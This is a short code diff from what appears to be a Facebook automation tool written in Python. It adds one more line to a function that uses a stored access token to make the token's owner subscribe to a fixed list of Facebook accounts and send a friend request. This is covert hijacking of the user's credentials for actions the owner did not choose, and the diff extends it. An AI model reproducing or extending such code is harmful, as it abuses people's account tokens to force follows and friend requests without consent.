@@ -219,6 +219,7 @@ def wuhan(kontol):
         requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100013031465766/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
